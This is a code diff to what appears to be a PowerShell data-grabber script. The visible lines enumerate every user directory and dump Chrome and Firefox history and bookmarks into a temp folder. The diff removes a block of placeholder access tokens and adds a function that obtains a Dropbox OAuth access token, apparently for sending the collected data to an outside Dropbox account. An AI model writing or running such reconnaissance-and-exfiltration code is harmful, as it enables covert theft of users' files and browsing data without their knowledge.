@@ -49,14 +49,6 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
-# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
-
-#$db = ""
-
-#$dc = ""
-
-############################################################################################################################################################
-
 # Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
@@ -512,6 +504,25 @@ Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\Br
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
+############################################################################################################################################################
+
+# Get DropBox access_token
+
+function get_access_token {
+$Body = @{
+    grant_type    = "refresh_token"
+    refresh_token = $refresh
+    client_id     = $key
+    client_secret = $secret
+}
+
+$response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
+
+$db = $response.access_token
+}
+
+get_access_token
 
 ############################################################################################################################################################
 
